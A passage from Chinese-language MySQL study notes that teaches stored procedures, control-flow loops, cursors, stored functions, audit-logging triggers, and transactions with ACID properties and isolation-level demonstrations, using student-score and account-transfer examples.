\t执行的sql语句;\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  ```\r\n\r\n  - 案例演示\r\n\r\n  ```mysql\r\n  /*\r\n  \t输入总成绩变量，代表学生总成绩\r\n  \t定义一个varchar变量，用于存储分数描述\r\n  \t根据总成绩判断：\r\n  \t\t380分及以上  学习优秀\r\n  \t\t320 ~ 380    学习不错\r\n  \t\t320以下      学习一般\r\n  */\r\n  DELIMITER $\r\n  \r\n  CREATE PROCEDURE pro_test5(IN total INT)\r\n  BEGIN\r\n  \t-- 定义分数描述变量\r\n  \tDECLARE description VARCHAR(10);\r\n  \t-- 判断总分数\r\n  \tIF total >= 380 THEN \r\n  \t\tSET description = '学习优秀';\r\n  \tELSEIF total >= 320 AND total < 380 THEN \r\n  \t\tSET description = '学习不错';\r\n  \tELSE \r\n  \t\tSET description = '学习一般';\r\n  \tEND IF;\r\n  \t\r\n  \t-- 查询总成绩和描述信息\r\n  \tSELECT total,description;\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  \r\n  -- 调用pro_test5存储过程\r\n  CALL pro_test5(390);\r\n  CALL pro_test5((SELECT SUM(score) FROM student));\r\n  ```\r\n\r\n- 输出参数\r\n\r\n  - 标准语法\r\n\r\n  ```mysql\r\n  DELIMITER $\r\n  \r\n  -- 标准语法\r\n  CREATE PROCEDURE 存储过程名称(OUT 参数名 数据类型)\r\n  BEGIN\r\n  \t执行的sql语句;\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  ```\r\n\r\n  - 案例演示\r\n\r\n  ```mysql\r\n  /*\r\n  \t输入总成绩变量，代表学生总成绩\r\n  \t输出分数描述变量，代表学生总成绩的描述\r\n  \t根据总成绩判断：\r\n  \t\t380分及以上  学习优秀\r\n  \t\t320 ~ 380    学习不错\r\n  \t\t320以下      学习一般\r\n  */\r\n  DELIMITER $\r\n  \r\n  CREATE PROCEDURE pro_test6(IN total INT,OUT description VARCHAR(10))\r\n  BEGIN\r\n  \t-- 判断总分数\r\n  \tIF total >= 380 THEN \r\n  \t\tSET description = '学习优秀';\r\n  \tELSEIF total >= 320 AND total < 380 THEN \r\n  \t\tSET description = '学习不错';\r\n  \tELSE \r\n  \t\tSET description = '学习一般';\r\n  \tEND IF;\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  \r\n  -- 调用pro_test6存储过程\r\n  CALL pro_test6(310,@description);\r\n  \r\n  -- 查询总成绩描述\r\n  SELECT @description;\r\n  ```\r\n\r\n  - 小知识\r\n\r\n  ```mysql\r\n  @变量名:  这种变量要在变量名称前面加上“@”符号，叫做用户会话变量，代表整个会话过程他都是有作用的，这个类似于全局变量一样。\r\n  \r\n  @@变量名: 这种在变量前加上 \"@@\" 符号, 叫做系统变量 \r\n  ```\r\n\r\n##### 8.5case语句的使用\r\n\r\n- 标准语法1\r\n\r\n```mysql\r\n-- 标准语法\r\nCASE 表达式\r\nWHEN 值1 THEN 执行sql语句1;\r\n[WHEN 值2 THEN 执行sql语句2;]\r\n...\r\n[ELSE 执行sql语句n;]\r\nEND CASE;\r\n```\r\n\r\n- 标准语法2\r\n\r\n```mysql\r\n-- 标准语法\r\nCASE\r\nWHEN 判断条件1 THEN 执行sql语句1;\r\n[WHEN 判断条件2 THEN 执行sql语句2;]\r\n...\r\n[ELSE 执行sql语句n;]\r\nEND CASE;\r\n```\r\n\r\n- 案例演示\r\n\r\n```mysql\r\n/*\r\n\t输入总成绩变量，代表学生总成绩\r\n\t定义一个varchar变量，用于存储分数描述\r\n\t根据总成绩判断：\r\n\t\t380分及以上  学习优秀\r\n\t\t320 ~ 380    学习不错\r\n\t\t320以下      学习一般\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test7(IN total INT)\r\nBEGIN\r\n\t-- 定义变量\r\n\tDECLARE description VARCHAR(10);\r\n\t-- 使用case判断\r\n\tCASE\r\n\tWHEN total >= 380 THEN\r\n\t\tSET description = '学习优秀';\r\n\tWHEN total >= 320 AND total < 380 THEN\r\n\t\tSET description = '学习不错';\r\n\tELSE \r\n\t\tSET description = '学习一般';\r\n\tEND CASE;\r\n\t\r\n\t-- 查询分数描述信息\r\n\tSELECT description;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test7存储过程\r\nCALL pro_test7(390);\r\nCALL pro_test7((SELECT SUM(score) FROM student));\r\n```\r\n\r\n##### 8.6while循环\r\n\r\n- 标准语法\r\n\r\n```mysql\r\n-- 标准语法\r\n初始化语句;\r\nWHILE 条件判断语句 DO\r\n\t循环体语句;\r\n\t条件控制语句;\r\nEND WHILE;\r\n```\r\n\r\n- 案例演示\r\n\r\n```mysql\r\n/*\r\n\t计算1~100之间的偶数和\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test8()\r\nBEGIN\r\n\t-- 定义求和变量\r\n\tDECLARE result INT DEFAULT 0;\r\n\t-- 定义初始化变量\r\n\tDECLARE num INT DEFAULT 1;\r\n\t-- while循环\r\n\tWHILE num <= 100 DO\r\n\t\t-- 偶数判断\r\n\t\tIF num%2=0 THEN\r\n\t\t\tSET result = result + num; -- 累加\r\n\t\tEND IF;\r\n\t\t\r\n\t\t-- 让num+1\r\n\t\tSET num = num + 1;         \r\n\tEND WHILE;\r\n\t\r\n\t-- 查询求和结果\r\n\tSELECT result;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test8存储过程\r\nCALL pro_test8();\r\n```\r\n\r\n##### 8.7repeat循环\r\n\r\n- 标准语法\r\n\r\n```mysql\r\n-- 标准语法\r\n初始化语句;\r\nREPEAT\r\n\t循环体语句;\r\n\t条件控制语句;\r\n\tUNTIL 条件判断语句\r\nEND REPEAT;\r\n\r\n-- 注意：repeat循环是条件满足则停止。while循环是条件满足则执行\r\n```\r\n\r\n- 案例演示\r\n\r\n```mysql\r\n/*\r\n\t计算1~10之间的和\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test9()\r\nBEGIN\r\n\t-- 定义求和变量\r\n\tDECLARE result INT DEFAULT 0;\r\n\t-- 定义初始化变量\r\n\tDECLARE num INT DEFAULT 1;\r\n\t-- repeat循环\r\n\tREPEAT\r\n\t\t-- 累加\r\n\t\tSET result = result + num;\r\n\t\t-- 让num+1\r\n\t\tSET num = num + 1;\r\n\t\t\r\n\t\t-- 停止循环\r\n\t\tUNTIL num>10\r\n\tEND REPEAT;\r\n\t\r\n\t-- 查询求和结果\r\n\tSELECT result;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test9存储过程\r\nCALL pro_test9();\r\n```\r\n\r\n##### 8.8loop循环\r\n\r\n- 标准语法\r\n\r\n```mysql\r\n-- 标准语法\r\n初始化语句;\r\n[循环名称:] LOOP\r\n\t条件判断语句\r\n\t\t[LEAVE 循环名称;]\r\n\t循环体语句;\r\n\t条件控制语句;\r\nEND LOOP 循环名称;\r\n\r\n-- 注意：loop可以实现简单的循环，但是退出循环需要使用其他的语句来定义。我们可以使用leave语句完成！\r\n--      如果不加退出循环的语句，那么就变成了死循环。\r\n```\r\n\r\n- 案例演示\r\n\r\n```mysql\r\n/*\r\n\t计算1~10之间的和\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test10()\r\nBEGIN\r\n\t-- 定义求和变量\r\n\tDECLARE result INT DEFAULT 0;\r\n\t-- 定义初始化变量\r\n\tDECLARE num INT DEFAULT 1;\r\n\t-- loop循环\r\n\tl:LOOP\r\n\t\t-- 条件成立，停止循环\r\n\t\tIF num > 10 THEN\r\n\t\t\tLEAVE l;\r\n\t\tEND IF;\r\n\t\r\n\t\t-- 累加\r\n\t\tSET result = result + num;\r\n\t\t-- 让num+1\r\n\t\tSET num = num + 1;\r\n\tEND LOOP l;\r\n\t\r\n\t-- 查询求和结果\r\n\tSELECT result;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test10存储过程\r\nCALL pro_test10();\r\n```\r\n\r\n##### 8.9游标\r\n\r\n- 游标的概念\r\n\r\n  - 游标可以遍历返回的多行结果，每次拿到一整行数据\r\n  - 在存储过程和函数中可以使用游标对结果集进行循环的处理\r\n  - 简单来说游标就类似于集合的迭代器遍历\r\n  - MySQL中的游标只能用在存储过程和函数中\r\n\r\n- 游标的语法\r\n\r\n  - 创建游标\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  DECLARE 游标名称 CURSOR FOR 查询sql语句;\r\n  ```\r\n\r\n  - 打开游标\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  OPEN 游标名称;\r\n  ```\r\n\r\n  - 使用游标获取数据\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  FETCH 游标名称 INTO 变量名1,变量名2,...;\r\n  ```\r\n\r\n  - 关闭游标\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  CLOSE 游标名称;\r\n  ```\r\n\r\n- 游标的基本使用\r\n\r\n```mysql\r\n-- 创建stu_score表\r\nCREATE TABLE stu_score(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\r\n\tscore INT\r\n);\r\n\r\n/*\r\n\t将student表中所有的成绩保存到stu_score表中\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test11()\r\nBEGIN\r\n\t-- 定义成绩变量\r\n\tDECLARE s_score INT;\r\n\t-- 创建游标,查询所有学生成绩数据\r\n\tDECLARE stu_result CURSOR FOR SELECT score FROM student;\r\n\t\r\n\t-- 开启游标\r\n\tOPEN stu_result;\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第1行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第2行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第3行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第4行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 关闭游标\r\n\tCLOSE stu_result;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test11存储过程\r\nCALL pro_test11();\r\n\r\n-- 查询stu_score表\r\nSELECT * FROM stu_score;\r\n\r\n\r\n-- ===========================================================\r\n/*\r\n\t出现的问题：\r\n\t\tstudent表中一共有4条数据，我们在游标遍历了4次，没有问题！\r\n\t\t但是在游标中多遍历几次呢？就会出现问题\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test11()\r\nBEGIN\r\n\t-- 定义成绩变量\r\n\tDECLARE s_score INT;\r\n\t-- 创建游标,查询所有学生成绩数据\r\n\tDECLARE stu_result CURSOR FOR SELECT score FROM student;\r\n\t\r\n\t-- 开启游标\r\n\tOPEN stu_result;\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第1行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第2行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第3行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第4行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 使用游标，遍历结果,拿到第5行数据\r\n\tFETCH stu_result INTO s_score;\r\n\t-- 将数据保存到stu_score表中\r\n\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\t\r\n\t-- 关闭游标\r\n\tCLOSE stu_result;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test11存储过程\r\nCALL pro_test11();\r\n\r\n-- 查询stu_score表,虽然数据正确，但是在执行存储过程时会报错\r\nSELECT * FROM stu_score;\r\n```\r\n\r\n- 游标的优化使用(配合循环使用)\r\n\r\n```mysql\r\n/*\r\n\t当游标结束后，会触发游标结束事件。我们可以通过这一特性来完成循环操作\r\n\t加标记思想：\r\n\t\t1.定义一个变量，默认值为0(意味着有数据)\r\n\t\t2.当游标结束后，将变量值改为1(意味着没有数据了)\r\n*/\r\n-- 1.定义一个变量，默认值为0(意味着有数据)\r\nDECLARE flag INT DEFAULT 0;\r\n-- 2.当游标结束后，将变量值改为1(意味着没有数据了)\r\nDECLARE EXIT HANDLER FOR NOT FOUND SET flag = 1;\r\n```\r\n\r\n```mysql\r\n/*\r\n\t将student表中所有的成绩保存到stu_score表中\r\n*/\r\nDELIMITER $\r\n\r\nCREATE PROCEDURE pro_test12()\r\nBEGIN\r\n\t-- 定义成绩变量\r\n\tDECLARE s_score INT;\r\n\t-- 定义标记变量\r\n\tDECLARE flag INT DEFAULT 0;\r\n\t-- 创建游标，查询所有学生成绩数据\r\n\tDECLARE stu_result CURSOR FOR SELECT score FROM student;\r\n\t-- 游标结束后，将标记变量改为1\r\n\tDECLARE EXIT HANDLER FOR NOT FOUND SET flag = 1;\r\n\t\r\n\t-- 开启游标\r\n\tOPEN stu_result;\r\n\t\r\n\t-- 循环使用游标\r\n\tREPEAT\r\n\t\t-- 使用游标，遍历结果,拿到数据\r\n\t\tFETCH stu_result INTO s_score;\r\n\t\t-- 将数据保存到stu_score表中\r\n\t\tINSERT INTO stu_score VALUES (NULL,s_score);\r\n\tUNTIL flag=1\r\n\tEND REPEAT;\r\n\t\r\n\t-- 关闭游标\r\n\tCLOSE stu_result;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用pro_test12存储过程\r\nCALL pro_test12();\r\n\r\n-- 查询stu_score表\r\nSELECT * FROM stu_score;\r\n```\r\n\r\n#### 9.存储过程的总结\r\n\r\n- 存储过程是 事先经过编译并存储在数据库中的一段 SQL 语句的集合。可以在数据库层面做一些业务处理\r\n- 说白了存储过程其实就是将sql语句封装为方法，然后可以调用方法执行sql语句而已\r\n- 存储过程的好处\r\n  - 安全\r\n  - 高效\r\n  - 复用性强\r\n\r\n#### 10.存储函数\r\n\r\n- 存储函数和存储过程是非常相似的。存储函数可以做的事情，存储过程也可以做到！\r\n\r\n- 存储函数有返回值，存储过程没有返回值(参数的out其实也相当于是返回数据了)\r\n\r\n- 标准语法\r\n\r\n  - 创建存储函数\r\n\r\n  ```mysql\r\n  DELIMITER $\r\n  \r\n  -- 标准语法\r\n  CREATE FUNCTION 函数名称([参数 数据类型])\r\n  RETURNS 返回值类型\r\n  BEGIN\r\n  \t执行的sql语句;\r\n  \tRETURN 结果;\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  ```\r\n\r\n  - 调用存储函数\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT 函数名称(实际参数);\r\n  ```\r\n\r\n  - 删除存储函数\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  DROP FUNCTION 函数名称;\r\n  ```\r\n\r\n- 案例演示\r\n\r\n```mysql\r\n/*\r\n\t定义存储函数，获取学生表中成绩大于95分的学生数量\r\n*/\r\nDELIMITER $\r\n\r\nCREATE FUNCTION fun_test1()\r\nRETURNS INT\r\nBEGIN\r\n\t-- 定义统计变量\r\n\tDECLARE result INT;\r\n\t-- 查询成绩大于95分的学生数量，给统计变量赋值\r\n\tSELECT COUNT(*) INTO result FROM student WHERE score > 95;\r\n\t-- 返回统计结果\r\n\tRETURN result;\r\nEND$\r\n\r\nDELIMITER ;\r\n\r\n-- 调用fun_test1存储函数\r\nSELECT fun_test1();\r\n```\r\n\r\n### 二、MySQL触发器\r\n\r\n#### 1.触发器的概念\r\n\r\n- 触发器是与表有关的数据库对象，可以在 insert/update/delete 之前或之后，触发并执行触发器中定义的SQL语句。触发器的这种特性可以协助应用在数据库端确保数据的完整性 、日志记录 、数据校验等操作 。\r\n- 使用别名 NEW 和 OLD 来引用触发器中发生变化的记录内容，这与其他的数据库是相似的。现在触发器还只支持行级触发，不支持语句级触发。\r\n\r\n| 触发器类型      | OLD的含义                      | NEW的含义                      |\r\n| --------------- | ------------------------------ | ------------------------------ |\r\n| INSERT 型触发器 | 无 (因为插入前状态无数据)      | NEW 表示将要或者已经新增的数据 |\r\n| UPDATE 型触发器 | OLD 表示修改之前的数据         | NEW 表示将要或已经修改后的数据 |\r\n| DELETE 型触发器 | OLD 表示将要或者已经删除的数据 | 无 (因为删除后状态无数据)      |\r\n\r\n#### 2.创建触发器\r\n\r\n- 标准语法\r\n\r\n```mysql\r\nDELIMITER $\r\n\r\nCREATE TRIGGER 触发器名称\r\nBEFORE|AFTER INSERT|UPDATE|DELETE\r\nON 表名\r\n[FOR EACH ROW]  -- 行级触发器\r\nBEGIN\r\n\t触发器要执行的功能;\r\nEND$\r\n\r\nDELIMITER ;\r\n```\r\n\r\n- 触发器演示。通过触发器记录账户表的数据变更日志。包含：增加、修改、删除\r\n\r\n  - 创建账户表\r\n\r\n  ```mysql\r\n  -- 创建db9数据库\r\n  CREATE DATABASE db9;\r\n  \r\n  -- 使用db9数据库\r\n  USE db9;\r\n  \r\n  -- 创建账户表account\r\n  CREATE TABLE account(\r\n  \tid INT PRIMARY KEY AUTO_INCREMENT,\t-- 账户id\r\n  \tNAME VARCHAR(20),\t\t\t\t\t-- 姓名\r\n  \tmoney DOUBLE\t\t\t\t\t\t-- 余额\r\n  );\r\n  -- 添加数据\r\n  INSERT INTO account VALUES (NULL,'张三',1000),(NULL,'李四',2000);\r\n  ```\r\n\r\n  - 创建日志表\r\n\r\n  ```mysql\r\n  -- 创建日志表account_log\r\n  CREATE TABLE account_log(\r\n  \tid INT PRIMARY KEY AUTO_INCREMENT,\t-- 日志id\r\n  \toperation VARCHAR(20),\t\t\t\t-- 操作类型 (insert update delete)\r\n  \toperation_time DATETIME,\t\t\t-- 操作时间\r\n  \toperation_id INT,\t\t\t\t\t-- 操作表的id\r\n  \toperation_params VARCHAR(200)       -- 操作参数\r\n  );\r\n  ```\r\n\r\n  - 创建INSERT触发器\r\n\r\n  ```mysql\r\n  -- 创建INSERT触发器\r\n  DELIMITER $\r\n  \r\n  CREATE TRIGGER account_insert\r\n  AFTER INSERT\r\n  ON account\r\n  FOR EACH ROW\r\n  BEGIN\r\n  \tINSERT INTO account_log VALUES (NULL,'INSERT',NOW(),new.id,CONCAT('插入后{id=',new.id,',name=',new.name,',money=',new.money,'}'));\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  \r\n  -- 向account表添加记录\r\n  INSERT INTO account VALUES (NULL,'王五',3000);\r\n  \r\n  -- 查询account表\r\n  SELECT * FROM account;\r\n  \r\n  -- 查询日志表\r\n  SELECT * FROM account_log;\r\n  ```\r\n\r\n  - 创建UPDATE触发器\r\n\r\n  ```mysql\r\n  -- 创建UPDATE触发器\r\n  DELIMITER $\r\n  \r\n  CREATE TRIGGER account_update\r\n  AFTER UPDATE\r\n  ON account\r\n  FOR EACH ROW\r\n  BEGIN\r\n  \tINSERT INTO account_log VALUES (NULL,'UPDATE',NOW(),new.id,CONCAT('修改前{id=',old.id,',name=',old.name,',money=',old.money,'}','修改后{id=',new.id,',name=',new.name,',money=',new.money,'}'));\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  \r\n  -- 修改account表\r\n  UPDATE account SET money=3500 WHERE id=3;\r\n  \r\n  -- 查询account表\r\n  SELECT * FROM account;\r\n  \r\n  -- 查询日志表\r\n  SELECT * FROM account_log;\r\n  ```\r\n\r\n  - 创建DELETE触发器\r\n\r\n  ```mysql\r\n  -- 创建DELETE触发器\r\n  DELIMITER $\r\n  \r\n  CREATE TRIGGER account_delete\r\n  AFTER DELETE\r\n  ON account\r\n  FOR EACH ROW\r\n  BEGIN\r\n  \tINSERT INTO account_log VALUES (NULL,'DELETE',NOW(),old.id,CONCAT('删除前{id=',old.id,',name=',old.name,',money=',old.money,'}'));\r\n  END$\r\n  \r\n  DELIMITER ;\r\n  \r\n  -- 删除account表数据\r\n  DELETE FROM account WHERE id=3;\r\n  \r\n  -- 查询account表\r\n  SELECT * FROM account;\r\n  \r\n  -- 查询日志表\r\n  SELECT * FROM account_log;\r\n  ```\r\n\r\n#### 3.查看触发器\r\n\r\n```mysql\r\n-- 标准语法\r\nSHOW TRIGGERS;\r\n\r\n-- 查看触发器\r\nSHOW TRIGGERS;\r\n```\r\n\r\n#### 4.删除触发器\r\n\r\n```mysql\r\n-- 标准语法\r\nDROP TRIGGER 触发器名称;\r\n\r\n-- 删除DELETE触发器\r\nDROP TRIGGER account_delete;\r\n```\r\n\r\n#### 5.触发器的总结\r\n\r\n- 触发器是与表有关的数据库对象\r\n- 可以在 insert/update/delete 之前或之后，触发并执行触发器中定义的SQL语句\r\n- 触发器的这种特性可以协助应用在数据库端确保数据的完整性 、日志记录 、数据校验等操作 \r\n- 使用别名 NEW 和 OLD 来引用触发器中发生变化的记录内容\r\n\r\n### 三、MySQL事务\r\n\r\n#### 1.事务的概念\r\n\r\n- 一条或多条 SQL 语句组成一个执行单元，其特点是这个单元要么同时成功要么同时失败，单元中的每条 SQL 语句都相互依赖，形成一个整体，如果某条 SQL 语句执行失败或者出现错误，那么整个单元就会回滚，撤回到事务最初的状态，如果单元中所有的 SQL 语句都执行成功，则事务就顺利执行。\r\n\r\n#### 2.事务的数据准备\r\n\r\n```mysql\r\n-- 创建db10数据库\r\nCREATE DATABASE db10;\r\n\r\n-- 使用db10数据库\r\nUSE db10;\r\n\r\n-- 创建账户表\r\nCREATE TABLE account(\r\n\tid INT PRIMARY KEY AUTO_INCREMENT,\t-- 账户id\r\n\tNAME VARCHAR(20),\t\t\t-- 账户名称\r\n\tmoney DOUBLE\t\t\t\t-- 账户余额\r\n);\r\n-- 添加数据\r\nINSERT INTO account VALUES (NULL,'张三',1000),(NULL,'李四',1000);\r\n```\r\n\r\n#### 3.未管理事务演示\r\n\r\n```mysql\r\n-- 张三给李四转账500元\r\n-- 1.张三账户-500\r\nUPDATE account SET money=money-500 WHERE NAME='张三';\r\n-- 2.李四账户+500\r\n出错了...\r\nUPDATE account SET money=money+500 WHERE NAME='李四';\r\n\r\n-- 该场景下，这两条sql语句要么同时成功，要么同时失败。就需要被事务所管理！\r\n```\r\n\r\n#### 4.管理事务演示\r\n\r\n- 操作事务的三个步骤\r\n  1. 开启事务：记录回滚点，并通知服务器，将要执行一组操作，要么同时成功、要么同时失败\r\n  2. 执行sql语句：执行具体的一条或多条sql语句\r\n  3. 结束事务(提交|回滚)\r\n     - 提交：没出现问题，数据进行更新\r\n     - 回滚：出现问题，数据恢复到开启事务时的状态\r\n- 开启事务\r\n\r\n```mysql\r\n-- 标准语法\r\nSTART TRANSACTION;\r\n```\r\n\r\n- 回滚事务\r\n\r\n```mysql\r\n-- 标准语法\r\nROLLBACK;\r\n```\r\n\r\n- 提交事务\r\n\r\n```mysql\r\n-- 标准语法\r\nCOMMIT;\r\n```\r\n\r\n- 管理事务演示\r\n\r\n```mysql\r\n-- 开启事务\r\nSTART TRANSACTION;\r\n\r\n-- 张三给李四转账500元\r\n-- 1.张三账户-500\r\nUPDATE account SET money=money-500 WHERE NAME='张三';\r\n-- 2.李四账户+500\r\n-- 出错了...\r\nUPDATE account SET money=money+500 WHERE NAME='李四';\r\n\r\n-- 回滚事务(出现问题)\r\nROLLBACK;\r\n\r\n-- 提交事务(没出现问题)\r\nCOMMIT;\r\n```\r\n\r\n#### 5.事务的提交方式\r\n\r\n- 提交方式\r\n\r\n  - 自动提交(MySQL默认为自动提交)\r\n  - 手动提交\r\n\r\n- 修改提交方式\r\n\r\n  - 查看提交方式\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SELECT @@AUTOCOMMIT;  -- 1代表自动提交    0代表手动提交\r\n  ```\r\n\r\n  - 修改提交方式\r\n\r\n  ```mysql\r\n  -- 标准语法\r\n  SET @@AUTOCOMMIT=数字;\r\n  \r\n  -- 修改为手动提交\r\n  SET @@AUTOCOMMIT=0;\r\n  \r\n  -- 查看提交方式\r\n  SELECT @@AUTOCOMMIT;\r\n  ```\r\n\r\n#### 6.事务的四大特征(ACID)\r\n\r\n- 原子性(atomicity)\r\n  - 原子性是指事务包含的所有操作要么全部成功，要么全部失败回滚，因此事务的操作如果成功就必须要完全应用到数据库，如果操作失败则不能对数据库有任何影响\r\n- 一致性(consistency)\r\n  - 一致性是指事务必须使数据库从一个一致性状态变换到另一个一致性状态，也就是说一个事务执行之前和执行之后都必须处于一致性状态\r\n  - 拿转账来说，假设张三和李四两者的钱加起来一共是2000，那么不管A和B之间如何转账，转几次账，事务结束后两个用户的钱相加起来应该还得是2000，这就是事务的一致性\r\n- 隔离性(isolcation)\r\n  - 隔离性是当多个用户并发访问数据库时，比如操作同一张表时，数据库为每一个用户开启的事务，不能被其他事务的操作所干扰，多个并发事务之间要相互隔离\r\n- 持久性(durability)\r\n  - 持久性是指一个事务一旦被提交了，那么对数据库中的数据的改变就是永久性的，即便是在数据库系统遇到故障的情况下也不会丢失提交事务的操作\r\n\r\n#### 7.事务的隔离级别\r\n\r\n- 隔离级别的概念\r\n  - 多个客户端操作时 ,各个客户端的事务之间应该是隔离的，相互独立的 , 不受影响的。\r\n  - 而如果多个事务操作同一批数据时，则需要设置不同的隔离级别 , 否则就会产生问题 。\r\n  - 我们先来了解一下四种隔离级别的名称 , 再来看看可能出现的问题\r\n- 四种隔离级别\r\n\r\n| 1     | 读未提交     | read uncommitted    |\r\n| ----- | ------------ | ------------------- |\r\n| **2** | **读已提交** | **read committed**  |\r\n| **3** | **可重复读** | **repeatable read** |\r\n| **4** | **串行化**   | **serializable**    |\r\n\r\n- 可能引发的问题\r\n\r\n| 问题           | 现象                                                         |\r\n| -------------- | ------------------------------------------------------------ |\r\n| **脏读**       | **是指在一个事务处理过程中读取了另一个未提交的事务中的数据 , 导致两次查询结果不一致** |\r\n| **不可重复读** | **是指在一个事务处理过程中读取了另一个事务中修改并已提交的数据, 导致两次查询结果不一致** |\r\n| **幻读**       | **select 某记录是否存在，不存在，准备插入此记录，但执行 insert 时发现此记录已存在，无法插入。或不存在执行delete删除，却发现删除成功** |\r\n\r\n- 查询数据库隔离级别\r\n\r\n```mysql\r\n-- 标准语法\r\nSELECT @@TX_ISOLATION;\r\n```\r\n\r\n- 修改数据库隔离级别\r\n\r\n```mysql\r\n-- 标准语法\r\nSET GLOBAL TRANSACTION ISOLATION LEVEL 级别字符串;\r\n\r\n-- 修改数据库隔离级别为read uncommitted\r\nSET GLOBAL TRANSACTION ISOLATION LEVEL read uncommitted;\r\n\r\n-- 查看隔离级别\r\nSELECT @@TX_ISOLATION;   -- 修改后需要断开连接重新开\r\n```\r\n\r\n#### 8.事务隔离级别演示\r\n\r\n- 脏读的问题\r\n\r\n  - 窗口1\r\n\r\n  ```mysql\r\n  -- 查询账户表\r\n  select * from account;\r\n  \r\n  -- 设置隔离级别为read uncommitted\r\n  set global transaction isolation level read uncommitted;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 转账\r\n  update account set money = money - 500 where id = 1;\r\n  update account set money = money + 500 where id = 2;\r\n  \r\n  -- 窗口2查询转账结果 ,出现脏读(查询到其他事务未提交的数据)\r\n  \r\n  -- 窗口2查看转账结果后，执行回滚\r\n  rollback;\r\n  ```\r\n\r\n  - 窗口2\r\n\r\n  ```mysql\r\n  -- 查询隔离级别\r\n  select @@tx_isolation;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 查询账户表\r\n  select * from account;\r\n  ```\r\n\r\n- 解决脏读的问题和演示不可重复读的问题\r\n\r\n  - 窗口1\r\n\r\n  ```mysql\r\n  -- 设置隔离级别为read committed\r\n  set global transaction isolation level read committed;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 转账\r\n  update account set money = money - 500 where id = 1;\r\n  update account set money = money + 500 where id = 2;\r\n  \r\n  -- 窗口2查看转账结果，并没有发生变化(脏读问题被解决了)\r\n  \r\n  -- 执行提交事务。\r\n  commit;\r\n  \r\n  -- 窗口2查看转账结果，数据发生了变化(出现了不可重复读的问题，读取到其他事务已提交的数据)\r\n  ```\r\n\r\n  - 窗口2\r\n\r\n  ```mysql\r\n  -- 查询隔离级别\r\n  select @@tx_isolation;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 查询账户表\r\n  select * from account;\r\n  ```\r\n\r\n- 解决不可重复读的问题\r\n\r\n  - 窗口1\r\n\r\n  ```mysql\r\n  -- 设置隔离级别为repeatable read\r\n  set global transaction isolation level repeatable read;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  \r\n  -- 转账\r\n  update account set money = money - 500 where id = 1;\r\n  update account set money = money + 500 where id = 2;\r\n  \r\n  -- 窗口2查看转账结果，并没有发生变化\r\n  \r\n  -- 执行提交事务\r\n  commit;\r\n  \r\n  -- 这个时候窗口2只要还在上次事务中，看到的结果都是相同的。只有窗口2结束事务，才能看到变化(不可重复读的问题被解决)\r\n  ```\r\n\r\n  - 窗口2\r\n\r\n  ```mysql\r\n  -- 查询隔离级别\r\n  select @@tx_isolation;\r\n  \r\n  -- 开启事务\r\n  start transaction;\r\n  